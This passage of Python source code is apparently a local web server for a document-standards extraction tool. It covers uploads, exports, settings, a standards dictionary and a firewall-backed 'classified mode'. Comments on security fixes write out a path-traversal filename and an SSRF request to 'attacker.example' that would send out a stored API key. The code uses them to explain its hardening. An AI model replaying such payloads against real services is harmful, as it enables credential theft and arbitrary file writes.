            self.handle_import_folder(data)
            return
        elif path == "/api/install_context_menu":
            self.handle_install_context_menu(data)
        elif path == "/api/uninstall_context_menu":
            self.handle_uninstall_context_menu(data)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")

    def handle_upload(self):
        """处理文件上传，保存到临时目录"""
        content_type = self.headers.get("Content-Type", "")
        if not content_type.startswith("multipart/form-data"):
            self._send_json({"error": "需要 multipart/form-data"}, 400)
            return
        m = re.search(r'boundary=([^;\s]+)', content_type)
        if not m:
            self._send_json({"error": "无法解析 boundary"}, 400)
            return
        boundary = m.group(1).strip('"')
        # 3-7（复审批）：安全解析 + 上限校验，**先判后读**。
        # 非数字的 Content-Length 会让 int() 抛异常（原来是未捕获的 500）；
        # 而超限的请求必须在 read() 之前拒绝，否则整包已进内存，限制就没意义了。
        try:
            content_length = int(self.headers.get("Content-Length", 0) or 0)
        except (TypeError, ValueError):
            log_print(f"[安全] 非法的 Content-Length: "
                      f"{sanitize_log(str(self.headers.get('Content-Length')))}", "WARN")
            self._send_json({"error": "Content-Length 非法"}, 400)
            return
        if content_length <= 0:
            self._send_json({"error": "请求体为空"}, 400)
            return
        if content_length > _MAX_UPLOAD_BODY:
            _mb = content_length // (1024 * 1024)
            _limit = _MAX_UPLOAD_BODY // (1024 * 1024)
            log_print(f"[安全] 上传体超限（{_mb}MB > {_limit}MB），已拒绝", "WARN")
            self._send_json({
                "error": f"上传内容过大（{_mb} MB），单次上限 {_limit} MB。"
                         f"请分批上传，或先压缩后再上传。"}, 413)
            return
        body = self.rfile.read(content_length)
        parts = _parse_multipart(body, boundary)

        os.makedirs(TMP_DIR, exist_ok=True)
        uploaded = []
        for part in parts:
            filename = part["filename"]
            ext = os.path.splitext(filename)[1].lower()
            # 原先只放行 docx/pdf/doc：Excel / PPT / 文本文件在网页上传时
            # 会被**静默丢弃**（用户看到"上传完成"却没有任何文件），
            # 而 core 里其实一直有 ExcelHandler。这里统一用支持清单。
            if ext not in _SUPPORTED_EXTS:
                log_print(f"[上传] 跳过不支持的类型: {sanitize_log(filename)}", "WARN")
                continue
            safe_name = os.path.basename(filename)
            tmp_path = os.path.join(TMP_DIR, safe_name)
            counter = 1
            base, ext_part = os.path.splitext(safe_name)
            while os.path.exists(tmp_path):
                tmp_path = os.path.join(TMP_DIR, f"{base}_{counter}{ext_part}")
                counter += 1
            with open(tmp_path, "wb") as f:
                f.write(part["content"])
            # 惰性页数：上传时不再逐个解析文件（见 /api/page_counts）
            uploaded.append({"path": tmp_path, "name": os.path.basename(tmp_path), "pages": 0})
        log_print(f"上传 {len(uploaded)} 个文件到 {TMP_DIR}", "INFO")
        self._send_json({"files": uploaded})

    def handle_export(self, data):
        """处理导出请求：生成 Excel/JSON 文件并返回下载 ID"""
        import re as _re

        def sanitize_text(val):
            """移除 openpyxl 不允许的非法 XML 控制字符"""
            if not isinstance(val, str):
                val = str(val)
            # 允许 \t, \n, \r (0x09, 0x0A, 0x0D)，其余控制字符移除
            return _re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F]', '', val)

        export_format = data.get("format", "excel")
        tables = data.get("tables", [])
        stats = data.get("stats", {})
        text = data.get("text", "")

        os.makedirs(EXPORT_DIR, exist_ok=True)
        # 允许调用方（异步任务）预先指定 id，这样取消/失败时能精确删掉半成品文件。
        # 但必须校验格式：这个词直接拼进文件名（EXPORT_DIR/<id>.xlsx），
        # 早先没有任何过滤，`..\\..\\某目录\\x` 就能把文件写到任意路径、
        # 甚至覆盖已有文件（配合 CSRF 就是一个可远程触发的任意写文件漏洞）。
        file_id = data.get("_file_id") or str(uuid.uuid4())
        if not re.match(r"^[A-Za-z0-9_-]{8,64}$", str(file_id)):
            log_print(f"[安全] 拒绝非法导出文件名: {file_id!r}", "WARN")
            self._send_json({"error": "非法的导出文件名"}, 400)
            return
        file_id = str(file_id)
        self._export_file_id = file_id
        self._progress(5, "正在准备导出数据…")

        if export_format == "excel":
            try:
                from openpyxl import Workbook
                from openpyxl.styles import Font, Alignment, PatternFill, Border, Side
                wb = Workbook()

                # Sheet 1: 标准提取结果
                ws1 = wb.active
                ws1.title = "标准提取结果"
                headers = ["序号", "标准名称", "内容", "来源页", "来源文件"]
                ws1.append(headers)
                header_fill = PatternFill(start_color="2563EB", end_color="2563EB", fill_type="solid")
                header_font = Font(color="FFFFFF", bold=True)
                thin_border = Border(
                    left=Side(style='thin'), right=Side(style='thin'),
                    top=Side(style='thin'), bottom=Side(style='thin')
                )
                for col in range(1, len(headers) + 1):
                    cell = ws1.cell(row=1, column=col)
                    cell.fill = header_fill
                    cell.font = header_font
                    cell.alignment = Alignment(horizontal='center', vertical='center', wrap_text=True)
                    cell.border = thin_border

                _total_rows = max(1, len(tables))
                for idx, row in enumerate(tables, start=1):
                    if self._cancelled():
                        raise RuntimeError("用户已取消导出")
                    if idx % 50 == 0 or idx == _total_rows:
                        self._progress(10 + 60 * idx / _total_rows,
                                       f"正在写入标准记录 {idx}/{_total_rows}…")
                    ws1.append([
                        idx,
                        sanitize_text(row.get("name", "")),
                        sanitize_text(row.get("content", "")),
                        sanitize_text(row.get("page", "")),
                        sanitize_text(row.get("file_name", ""))
                    ])

                # 设置列宽
                ws1.column_dimensions['A'].width = 8
                ws1.column_dimensions['B'].width = 25
                ws1.column_dimensions['C'].width = 50
                ws1.column_dimensions['D'].width = 15
                ws1.column_dimensions['E'].width = 30
                for row in ws1.iter_rows(min_row=2):
                    for cell in row:
                        cell.border = thin_border
                        cell.alignment = Alignment(vertical='top', wrap_text=True)

                # Sheet 2: 统计信息
                ws2 = wb.create_sheet(title="统计信息")
                ws2.append(["标准名称", "出现次数", "出现位置"])
                for col in range(1, 4):
                    cell = ws2.cell(row=1, column=col)
                    cell.fill = header_fill
                    cell.font = header_font
                    cell.alignment = Alignment(horizontal='center', vertical='center')
                    cell.border = thin_border
                ws2.column_dimensions['A'].width = 30
                ws2.column_dimensions['B'].width = 12
                ws2.column_dimensions['C'].width = 60

                _stat_items = list(stats.items())
                _stat_total = max(1, len(_stat_items))
                for _si, (name, info) in enumerate(_stat_items, start=1):
                    if self._cancelled():
                        raise RuntimeError("用户已取消导出")
                    if _si % 20 == 0 or _si == _stat_total:
                        self._progress(72 + 16 * _si / _stat_total,
                                       f"正在写入统计信息 {_si}/{_stat_total}…")
                    locations = info.get("locations", [])
                    loc_str = "; ".join(
                        f"{sanitize_text(loc.get('file_name', ''))} {sanitize_text(loc.get('page', ''))}"
                        for loc in locations
                    )
                    ws2.append([sanitize_text(name), info.get("count", 0), loc_str])
                    # file counts detail
                    file_counts = info.get("file_counts", {})
                    if file_counts:
                        ws2.append(["", "按文件", "; ".join(f"{k}: {v}" for k, v in file_counts.items())])
                    # folder counts detail
                    folder_counts = info.get("folder_counts", {})
                    if folder_counts:
                        ws2.append(["", "按文件夹", "; ".join(f"{k}: {v}" for k, v in folder_counts.items())])
                for row in ws2.iter_rows(min_row=2):
                    for cell in row:
                        cell.border = thin_border
                        cell.alignment = Alignment(vertical='top', wrap_text=True)

                # Sheet 3: 提取文本
                if text:
                    ws3 = wb.create_sheet(title="提取文本")
                    ws3.append(["提取文本"])
                    ws3.cell(row=1, column=1).fill = header_fill
                    ws3.cell(row=1, column=1).font = header_font
                    ws3.column_dimensions['A'].width = 100
                    for _li, line in enumerate(text.split('\n'), start=1):
                        if _li % 200 == 0 and self._cancelled():
                            raise RuntimeError("用户已取消导出")
                        ws3.append([sanitize_text(line)])
                    for row in ws3.iter_rows(min_row=2):
                        for cell in row:
                            cell.alignment = Alignment(vertical='top', wrap_text=True)

                self._progress(90, "正在生成 Excel 文件…")
                file_path = os.path.join(EXPORT_DIR, f"{file_id}.xlsx")
                wb.save(file_path)
                log_print(f"导出 Excel: {file_path}", "INFO")
                self._send_json({
                    "success": True,
                    "temp_path": file_path,
                    "filename": f"标准处理结果_{time.strftime('%Y%m%d_%H%M%S')}.xlsx"
                })
            except Exception as e:
                import traceback
                # traceback 只写日志，不下发给前端（避免把本地路径/堆栈弹给用户）
                log_print(f"导出 Excel 失败: {e}\n{traceback.format_exc()}", "ERROR")
                self._send_json({"error": str(e)}, 500)

        elif export_format == "json":
            try:
                self._progress(50, "正在生成 JSON 文件…")
                export_data = {
                    "tables": tables,
                    "stats": stats,
                    "text": text,
                    "exported_at": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                file_path = os.path.join(EXPORT_DIR, f"{file_id}.json")
                with open(file_path, "w", encoding="utf-8") as f:
                    json.dump(export_data, f, ensure_ascii=False, indent=2)
                log_print(f"导出 JSON: {file_path}", "INFO")
                self._send_json({
                    "success": True,
                    "temp_path": file_path,
                    "filename": f"标准处理结果_{time.strftime('%Y%m%d_%H%M%S')}.json"
                })
            except Exception as e:
                import traceback
                log_print(f"导出 JSON 失败: {e}\n{traceback.format_exc()}", "ERROR")
                self._send_json({"error": str(e)}, 500)

        elif export_format == "csv":
            try:
                import csv
                self._progress(50, "正在生成 CSV 文件…")
                file_path = os.path.join(EXPORT_DIR, f"{file_id}.csv")
                with open(file_path, "w", encoding="utf-8-sig", newline="") as f:
                    writer = csv.writer(f)
                    writer.writerow(["序号", "标准名称", "内容", "来源页", "来源文件"])
                    for idx, row in enumerate(tables, start=1):
                        if idx % 200 == 0 and self._cancelled():
                            raise RuntimeError("用户已取消导出")
                        writer.writerow([
                            idx,
                            row.get("name", ""),
                            row.get("content", ""),
                            row.get("page", ""),
                            row.get("file_name", "")
                        ])
                log_print(f"导出 CSV: {file_path}", "INFO")
                self._send_json({
                    "success": True,
                    "temp_path": file_path,
                    "filename": f"标准处理结果_{time.strftime('%Y%m%d_%H%M%S')}.csv"
                })
            except Exception as e:
                import traceback
                log_print(f"导出 CSV 失败: {e}\n{traceback.format_exc()}", "ERROR")
                self._send_json({"error": str(e)}, 500)
        else:
            self._send_json({"error": f"不支持的导出格式: {export_format}"}, 400)

    def handle_save_dialog(self, data):
        """弹出保存对话框，让用户选择保存路径后复制文件"""
        temp_path = data.get("temp_path", "")
        # 安全（H5）：filename 会被当作"默认文件名"，去掉任何路径成分
        filename = os.path.basename(str(data.get("filename") or "导出文件")) or "导出文件"
        if not temp_path or not os.path.isfile(temp_path):
            self._send_json({"error": "临时文件不存在"}, 400)
            return
        # 安全（H5）：只允许保存本程序自己生成的导出文件，不接受任意本地路径
        if not _is_export_file(temp_path):
            log_print(f"[安全] 拒绝保存未授权的文件: {sanitize_log(temp_path)}", "WARN")
            self._send_json({"error": "该文件不是本程序生成的导出文件，已拒绝保存"}, 403)
            return

        import tkinter as tk
        from tkinter import filedialog

        root = tk.Tk()
        root.withdraw()
        # 根据文件名推断默认后缀
        _, ext = os.path.splitext(filename)
        if not ext:
            ext = ".xlsx"
        filetypes = [
            ("Excel 文件", "*.xlsx"),
            ("JSON 文件", "*.json"),
            ("CSV 文件", "*.csv"),
            ("所有文件", "*.*")
        ]
        dest = filedialog.asksaveasfilename(
            title="选择保存位置",
            defaultextension=ext,
            initialfile=filename,
            filetypes=filetypes
        )
        root.destroy()

        if not dest:
            self._send_json({"success": False, "message": "用户取消保存"})
            return

        try:
            import shutil
            shutil.copy2(temp_path, dest)
            log_print(f"文件已保存到: {dest}", "INFO")
            self._send_json({"success": True, "saved_path": dest, "message": f"已保存到: {dest}"})
        except Exception as e:
            log_print(f"保存文件失败: {e}", "ERROR")
            self._send_json({"error": str(e)}, 500)

    def handle_save_settings(self, data):
        """将设置保存到服务器本地 JSON 文件，并实时应用涉密模式"""
        try:
            # 落盘前先净化 AI 配置（保留掩码对应的真实 Key、校验地址）
            data = _sanitize_ai_settings(data)
            # "被拒绝的 AI 地址"只用于回传提示，不能写进配置文件（否则文件里会留垃圾键）
            _rejected_ai_url = ""
            try:
                _ai_cfg = data.get("localAI")
                if isinstance(_ai_cfg, dict):
                    _rejected_ai_url = str(_ai_cfg.pop("rejectedUrl", "") or "")
            except Exception:
                pass
            settings_path = _user_data(".app_settings.json")
            with open(settings_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            # 前缀开关随设置一起存进 .app_settings.json 的 builtinPrefixes（上面已落盘）。
            # 不再改写 builtin_prefixes.json：它是随程序分发的**默认值**，
            # 旧版把用户开关写进去，既会在 %ProgramFiles% 下写不进去，
            # 又会导致"升级后新分组（TB/T、ISO）永远不生效"。运行时按
            # _effective_prefix_groups() 合并（默认值 + 用户覆盖）。
            # 这里立刻重编译识别正则，让"保存后立即生效"名副其实
            _apply_prefix_config()
            # 实时应用涉密模式设置
            classified_enabled = bool(data.get("classifiedMode", False))
            # 安全：关闭涉密模式需要管理员权限。原来这条"保存设置"路径完全不校验，
            # 任意本地未认证请求都能借它把涉密防护静默解除。
            # 这里选择「忽略该字段、其余设置照常保存」而不是整体拒绝 ——
            # 否则非管理员用户会连续保存主题设置都做不了（体验陷阱）。
            _classify_forced = False
            if (not classified_enabled) and is_classified() and not _may_disable_classified():
                log_print("[安全] 忽略「关闭涉密模式」的请求（当前无管理员权限）", "WARN")
                classified_enabled = True
                _classify_forced = True
            # 先真正装卸防火墙，成功后才落盘涉密标记：反过来会在防火墙安装失败时
            # 留下 classifiedMode=true 的残留标记，下次启动按错误状态处理
            _fw_ok = True
            if classified_enabled:
                # 2-11（复审批）：**必须有成功判定**。原来不检查 install_firewall() 的
                # 返回值 —— 安装失败（无管理员权限 / UAC 被拒 / 规则冲突）时依然
                # set_classified_mode(True)，于是留下 classifiedMode=true 残留，
                # 下次启动会按错误状态处理（可能把联网一起挡了）。
                # 保守判定：只有当明确返回 False 才算失败（返回 None 视为旧契约不表态）。
                try:
                    if install_firewall() is False:
                        _fw_ok = False
                except Exception as _fwe:
                    _fw_ok = False
                    log_print(f"[安全] 防火墙安装异常: {_fwe}", "ERROR")
                if _fw_ok:
                    set_classified_mode(True)
                    log_print("涉密模式已启用，防火墙已激活", "SECURITY")
                else:
                    classified_enabled = False
                    set_classified_mode(False)
                    log_print("[安全] 防火墙安装未成功 → 不进入涉密模式"
                              "（避免留下 classifiedMode=true 残留）", "ERROR")
            else:
                remove_firewall()
                set_classified_mode(False)
                log_print("涉密模式已关闭，防火墙已卸载", "SECURITY")
            # 2-11：按**实际结果**回写设置文件。
            # 设置文件在上面已整体写盘，其中 classifiedMode 是客户端传来的原值 ——
            # 与"最终生效值"可能不同（安装失败降级、非管理员被强制保持开启）。
            try:
                with open(settings_path, "r", encoding="utf-8") as _rf:
                    _st = json.load(_rf) or {}
                if bool(_st.get("classifiedMode")) != bool(classified_enabled):
                    _st["classifiedMode"] = bool(classified_enabled)
                    with open(settings_path, "w", encoding="utf-8") as _wf:
                        json.dump(_st, _wf, ensure_ascii=False, indent=2)
                    log_print(f"[涉密] 已按实际结果回写 classifiedMode="
                              f"{bool(classified_enabled)}", "SECURITY")
            except Exception as _rwe:
                log_print(f"[涉密] 回写 classifiedMode 失败: {_rwe}", "WARN")
            _resp = {"success": True}
            if _classify_forced:
                _resp["warning"] = "关闭涉密模式需要管理员权限，本次已保持开启（其余设置已保存）。"
            if _rejected_ai_url:
                # 明确告知地址没被保存，避免"填了却没生效"的静默失败
                _resp["localAI"] = {"rejectedUrl": _rejected_ai_url}
            self._send_json(_resp)
            log_print(f"设置已保存到 {settings_path}", "INFO")
        except Exception as e:
            log_print(f"保存设置失败: {e}", "ERROR")
            self._send_json({"error": str(e)}, 500)

    # ── 字典管理 API ──────────────────────────────
    def _dict_db(self):
        # 数据库位于可写数据目录（%LOCALAPPDATA%\标准处理系统），与 utils.helpers 保持一致
        db_path = _user_data("标准名称字典.db")
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        return conn

    def handle_dict_review(self):
        try:
            conn = self._dict_db()
            rows = conn.execute("SELECT standard_no, display_name FROM review ORDER BY standard_no").fetchall()
            conn.close()
            items = []
            for r in rows:
                dn = r["display_name"]
                name = dn.split("《", 1)[1].rstrip("》") if "《" in dn else ""
                items.append({"display": dn, "no": r["standard_no"], "name": name})
            self._send_json({"items": items, "total": len(items)})
        except Exception as e:
            self._send_json({"error": str(e)}, 500)

    def handle_dict_batch_review(self, data):
        """批量审核待处理标准。action: approve|reject，lines: 完整显示名列表"""
        action = data.get("action", "")
        lines = data.get("lines") or []
        if action not in ("approve", "reject"):
            self._send_json({"error": "无效的审核动作"}, 400)
            return
        if not isinstance(lines, list):
            self._send_json({"error": "lines 必须是数组"}, 400)
            return

        from utils.helpers import add_standard_to_main, _remove_from_review
        ok = fail = 0
        for line in lines:
            if not line:
                continue
            try:
                if action == "approve":
                    # 已存在于主库时 add_standard_to_main 返回 False，
                    # 此时仍需从待审核移除，避免该项一直滞留队列。
                    if not add_standard_to_main(line):
                        _remove_from_review(line)
                else:
                    _remove_from_review(line)
                ok += 1
            except Exception as e:
                fail += 1
                log_print(f"批量审核失败: {sanitize_log(line)} -> {e}", "WARN")
        log_print(f"批量审核完成：{action} 成功 {ok} 条，失败 {fail} 条", "INFO")
        self._send_json({"success": True, "ok": ok, "fail": fail})

    def handle_dict_approve(self, data):
        from utils.helpers import add_standard_to_main
        line = data.get("line", "")
        if not line:
            self._send_json({"error": "缺少标准行"})
            return
        ok = add_standard_to_main(line)
        if not ok:
            # add_standard_to_main 返回 False 的常见原因是"该编号已在主库里"。
            # 原实现直接回 {"success": false} 且不带 error，也不清待审核条目 ——
            # 用户看到的是"通过失败：服务器返回 200"（完全看不懂），
            # 条目还永远卡在队列里，只能改用「拒绝」才能清掉。
            from utils.helpers import _remove_from_review
            _remove_from_review(line)
            log_print(f"字典审核：{line[:40]} 已在主库中，已从待审核移除", "INFO")
            self._send_json({"success": True,
                             "message": "该标准号已在主库中，已从待审核列表移除"})
            return
        self._send_json({"success": True})

    def handle_dict_reject(self, data):
        line = data.get("line", "")
        if not line:
            self._send_json({"error": "缺少标准行"})
            return
        from utils.helpers import _remove_from_review
        _remove_from_review(line)
        self._send_json({"success": True})

    def handle_dict_main(self):
        try:
            conn = self._dict_db()
            rows = conn.execute("SELECT standard_no, display_name FROM main ORDER BY standard_no").fetchall()
            conn.close()
            items = [{"display": r["display_name"], "no": r["standard_no"]} for r in rows]
            self._send_json({"items": items, "total": len(items)})
        except Exception as e:
            self._send_json({"error": str(e)}, 500)

    def handle_dict_add(self, data):
        text = data.get("text", "").strip()
        if not text or "《" not in text:
            self._send_json({"error": "格式错误，需要 标准编号《名称》"})
            return
        m = re.match(r'^(.+?)《', text)
        if not m:
            self._send_json({"error": "格式错误"})
            return
        std_no = m.group(1).strip()
        try:
            conn = self._dict_db()
            cur = conn.execute("SELECT 1 FROM main WHERE standard_no=?", (std_no,))
            if cur.fetchone():
                conn.close()
                self._send_json({"error": "该标准编号已存在"})
                return
            conn.execute("INSERT INTO main (standard_no, display_name) VALUES (?, ?)", (std_no, text))
            conn.commit()
            conn.close()
            self._send_json({"success": True, "message": f"已添加: {text}"})
        except Exception as e:
            self._send_json({"error": str(e)}, 500)

    def handle_dict_delete(self, data):
        std_no = data.get("no", "").strip()
        if not std_no:
            self._send_json({"error": "缺少标准编号"})
            return
        try:
            conn = self._dict_db()
            conn.execute("DELETE FROM main WHERE standard_no=?", (std_no,))
            conn.commit()
            conn.close()
            self._send_json({"success": True, "message": f"已删除: {std_no}"})
        except Exception as e:
            self._send_json({"error": str(e)}, 500)

    def handle_set_classified_mode(self, data):
        """运行时实时切换涉密模式（全有或全无，无降级方案）"""
        enabled = data.get("enabled", False)
        try:
            if enabled and not _check_admin():
                # 无管理员权限 → 必须提权，不提供降级
                self._send_json({
                    "success": False,
                    "classified": False,
                    "need_elevation": True,
                    "message": "涉密模式需要管理员权限才能安装 Windows 防火墙规则，是否以管理员身份重启？",
                })
                return

            # 安全：**关闭**涉密模式同样需要管理员权限（原来只校验"开启"，
            # 于是任意本地未认证请求都能静默解除防护）
            if (not enabled) and is_classified() and not _may_disable_classified():
                log_print("[安全] 拒绝关闭涉密模式：当前没有管理员权限", "WARN")
                self._send_json({
                    "success": False, "classified": True, "need_elevation": True,
                    "message": "关闭涉密模式需要管理员权限，请先「以管理员身份重启」再关闭。",
                }, 403)
                return

            # 先真正装卸防火墙，成功后才落盘涉密标记。
            # 反过来的话，安装失败也会把 classifiedMode=true 写进设置文件，
            # 下次启动会按残留标记误判（本次却并没有防火墙）。
            if enabled:
                install_firewall()
                set_classified_mode(True)
                log_print("涉密模式已启用，防火墙已激活", "SECURITY")
            else:
                remove_firewall()
                set_classified_mode(False)
                log_print("涉密模式已关闭，防火墙已卸载", "SECURITY")
            self._send_json({"success": True, "classified": enabled})
        except Exception as e:
            log_print(f"切换涉密模式失败: {e}", "ERROR")
            self._send_json({"error": str(e)}, 500)

    def handle_restart_as_admin(self, data):
        """以管理员权限重启程序"""
        try:
            restart_as_admin()
            self._send_json({"success": True, "restarting": True})
        except Exception as e:
            log_print(f"提权重启失败: {e}", "ERROR")
            self._send_json({"error": str(e)}, 500)

    def handle_load_settings(self):
        """从服务器本地 JSON 文件加载设置"""
        try:
            settings_path = _user_data(".app_settings.json")
            if os.path.exists(settings_path):
                with open(settings_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self._send_json(_mask_ai_key(data))
            else:
                self._send_json({})
        except Exception as e:
            log_print(f"加载设置失败: {e}", "ERROR")
            self._send_json({})

    # ── 本地 AI（LOCAL_AI_URL）配置接口 ────────────────
    def handle_page_counts(self, data):
        """批量统计页数（惰性回填用）。

        为什么单独开接口：统计页数要真的打开并解析文件，原先这件事是在
        "选文件夹/上传"的请求线程里逐个同步做的 —— 请求被占住，界面无进度、
        不能取消；对几百个大文件或网络盘就是几十秒到几分钟的假死。
        现在改为界面分批来取，本接口内部并行统计（实测 60 个文件 0.53s → 0.10s，
        命中缓存 0.004s）。

        安全：只统计**确实交给过界面**的文件（is_preview_allowed），
        否则这会变成一个"任意路径页数探测"接口。
        """
        try:
            paths = (data or {}).get("paths") or []
            if not isinstance(paths, list):
                paths = []
            paths = [str(p) for p in paths
                     if isinstance(p, str) and p and is_preview_allowed(p)
                     and os.path.isfile(p)]
            result = count_pages_parallel(paths)
            self._send_json({"files": result, "count": len(result)})
        except Exception as e:
            log_print(f"批量统计页数失败: {e}", "WARN")
            self._send_json({"files": [], "error": str(e)})

    def handle_ai_status(self):
        """返回本地 AI 的当前生效配置（供设置页显示，不回传明文 Key）。

        同时告诉前端这份配置来自「设置页」还是「环境变量」：用户设了环境变量却
        在设置页里看不到时，能立刻明白状态从哪来的。
        """
        try:
            from core.ai_handler import load_ai_config
            cfg = load_ai_config()
            available = False
            classified = False
            try:
                from core.security_config import is_classified
                classified = bool(is_classified())
            except Exception:
                pass
            available = bool(cfg["enabled"] and cfg["url"] and not classified)
            self._send_json({
                "enabled": cfg["enabled"],
                "url": cfg["url"],
                "model": cfg["model"],
                "hasApiKey": bool(cfg["apiKey"]),
                "apiKeyMask": AI_KEY_MASK if cfg["apiKey"] else "",
                "source": cfg["source"],          # settings | env | none
                "settings_present": cfg["settings_present"],
                "default_url": DEFAULT_AI_URL,
                "allowRemote": bool(cfg.get("allowRemote", False)),
                "isLoopback": _is_loopback_url(cfg["url"]) if cfg["url"] else True,
                "classified": classified,
                "available": available,
            })
        except Exception as e:
            log_print(f"读取本地 AI 配置失败: {e}", "WARN")
            self._send_json({"enabled": False, "url": "", "model": "default",
                             "hasApiKey": False, "source": "none",
                             "available": False, "error": str(e)})

    def handle_ai_test(self, data):
        """测试本地 AI 连接（设置页「测试连接」按钮）

        直接用界面上当前填写的值测试，**不要求先保存**；若前端回传的是 Key 掩码，
        则替换成已保存的真实 Key。
        """
        try:
            from core.ai_handler import LocalAIHandler
            handler = LocalAIHandler(lambda m: log_print(m, "INFO"))
            overrides = {}
            if isinstance(data, dict):
                overrides = {
                    "url": data.get("url") or "",
                    "model": data.get("model") or "",
                    "apiKey": data.get("apiKey") or "",
                    "enabled": data.get("enabled"),
                }
                _test_url = str(overrides.get("url") or "").strip()
                # 复审批 2-3：**非本机地址直接拒绝测试**。
                # 否则 /api/ai_test 就是一个 SSRF 跳板：任何能调本地 API 的人
                # 都能让本程序去请求任意内网/公网地址，并把响应正文回传给他。
                # 上一版只堵了"真实 Key 不外发"，SSRF 本身仍成立。
                if _test_url and not _is_loopback_url(_test_url):
                    log_print(f"[安全] 已拒绝向非本机地址发起 AI 测试: "
                              f"{sanitize_log(_test_url)}", "WARN")
                    self._send_json({
                        "ok": False, "url": _test_url, "status_code": 0,
                        "error": "出于安全考虑，AI 连接测试仅允许本机地址"
                                 "（localhost / 127.0.0.1 / [::1]）。"
                                 "如需访问其它主机，请先用 curl 在外部验证连通性。",
                    })
                    return
                if overrides["apiKey"] == AI_KEY_MASK:
                    # 复审批 N1（本批引入的缺陷）：**只有目标是本机回环时**才把掩码
                    # 换成已保存的真实 Key。否则任何能调用本地 API 的人提交
                    #   {"url":"http://attacker.example/x","apiKey":"********"}
                    # 就能让程序把真实 Key 作为 Authorization: Bearer 发到该地址，
                    # 并把响应内容回传（SSRF + Key 外泄）。
                    if _test_url and not _is_loopback_url(_test_url):
                        overrides["apiKey"] = ""
                        log_print(f"[安全] AI 测试目标非本机，已禁用真实 Key: "
                                  f"{sanitize_log(_test_url)}", "WARN")
                    else:
                        # 掩码 → 用已保存的真实 Key（用户没改 Key 就点测试）
                        overrides["apiKey"] = handler.api_key
            info = handler.test_connection(overrides=overrides)
            log_print(f"本地 AI 连接测试: {'成功' if info.get('ok') else '失败'} "
                      f"{info.get('url')} {info.get('error', '')}", "INFO")
            self._send_json(info)
        except Exception as e:
            log_print(f"本地 AI 连接测试异常: {e}", "WARN")
            self._send_json({"ok": False, "error": str(e)}, 500)

    def handle_tutorial_check(self):
        """前端启动时询问：这次是否需要展示教程模式"""
        should, version, reason = tutorial_should_show()
        self._send_json({"should_show": should, "version": version, "reason": reason})

    def handle_tutorial_done(self):
        """教程已完成/已跳过：记下当前版本，下次更新前不再自动弹出"""
        state = _read_tutorial_state()
        state["done_version"] = _app_version()
        state["pending"] = False
        state["done_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
        _write_tutorial_state(state)
        log_print("教程模式已完成，本次版本不再自动弹出", "INIT")
        self._send_json({"ok": True})

    def handle_reset(self, data):
        """初始化程序：按所选项目清理本地数据，恢复初始状态。

        targets 可包含：settings（界面与处理设置） / prefixes（前缀库恢复默认）
        / dict（清空标准名称字典） / cache（临时与导出缓存）

        安全约束：涉密模式属安全策略，初始化时保留其状态，
        不允许通过"初始化"绕过或关闭涉密防护。
        """
        # 处理任务进行中禁止初始化：清理缓存会把正在处理的文件副本删掉，
        # 清空字典会让结果里的名称全被剥成纯标准号（任务中途失败且数据半残）。
        if _process_lock.locked():
            self._send_json({
                "success": False,
                "failed": ["busy"],
                "error": "正在处理文件，请先「终止处理」再做初始化，避免清掉正在使用的文件与字典。",
            }, 409)
            return
        targets = data.get("targets") or []
        if isinstance(targets, str):
            targets = [targets]
        result = {}
        root = _root_dir()

        # 初始化后重新引导用户：把教程标记为"待展示"，重启也会再弹一次
        _tstate = _read_tutorial_state()
        _tstate["pending"] = True
        _write_tutorial_state(_tstate)

        # 1) 界面与处理设置
        if "settings" in targets:
            settings_path = _user_data(".app_settings.json")
            try:
                preserved = {}
                if os.path.exists(settings_path):
                    try:
                        with open(settings_path, "r", encoding="utf-8") as f:
                            old = json.load(f)
                        if isinstance(old, dict) and old.get("classifiedMode"):
                            preserved["classifiedMode"] = True
                    except Exception:
                        pass
                    os.remove(settings_path)
                if preserved:
                    with open(settings_path, "w", encoding="utf-8") as f:
                        json.dump(preserved, f, ensure_ascii=False, indent=2)
                result["settings"] = True
                log_print("初始化：已重置程序设置", "INIT")
            except Exception as e:
                result["settings"] = False
                log_print(f"初始化设置失败: {e}", "ERROR")

        # 2) 标准号前缀库（恢复默认：清掉用户在设置页的覆盖，改用随包内置默认）
        if "prefixes" in targets:
            try:
                sp = _user_data(".app_settings.json")
                st = {}
                if os.path.exists(sp):
                    with open(sp, "r", encoding="utf-8") as f:
                        st = json.load(f) or {}
                if isinstance(st, dict):
                    st.pop("builtinPrefixes", None)     # 覆盖清空 → 回到内置默认
                    with open(sp, "w", encoding="utf-8") as f:
                        json.dump(st, f, ensure_ascii=False, indent=2)
                result["prefixes"] = True
                log_print("初始化：已恢复前缀库默认（清除用户覆盖）", "INIT")
            except Exception as e:
                result["prefixes"] = False
                log_print(f"初始化前缀库失败: {e}", "ERROR")

        # 3) 标准名称字典（清空主库与待审核）
        if "dict" in targets:
            try:
                conn = self._dict_db()
                conn.execute("DELETE FROM main")
                conn.execute("DELETE FROM review")
                conn.commit()
                conn.close()
                result["dict"] = True
                log_print("初始化：已清空标准名称字典", "INIT")
            except Exception as e:
                result["dict"] = False
                log_print(f"初始化字典失败: {e}", "ERROR")

        # 4) 临时文件与导出缓存
        if "cache" in targets:
            try:
                import shutil
                for d in (TMP_DIR, EXPORT_DIR):
                    if os.path.isdir(d):
                        shutil.rmtree(d, ignore_errors=True)
                    os.makedirs(d, exist_ok=True)
                result["cache"] = True
                log_print("初始化：已清理临时与导出缓存", "INIT")
            except Exception as e:
                result["cache"] = False
                log_print(f"初始化缓存失败: {e}", "ERROR")

        failed = [k for k, v in result.items() if v is False]
        self._send_json({
            "success": not failed,
            "result": result,
            "failed": failed,
            "needRestart": True,
        })

    def handle_builtin_prefixes(self):
        """返回内置标准前缀配置 + **后端实际生效的前缀集合**。

        2-10②（顾问/产品专家）：只回传分组勾选状态是不够的 —— 勾选状态与真实
        生效范围经常不一致：组未勾选但组内单项为 true、Q/CR 被 enableQStandard
        连带关闭、以及"全部关闭"会按设计回退到内置默认表。用户看着勾选框以为
        设置生效了，实际识别范围是另一个样子（最容易被当成"程序漏识别"）。
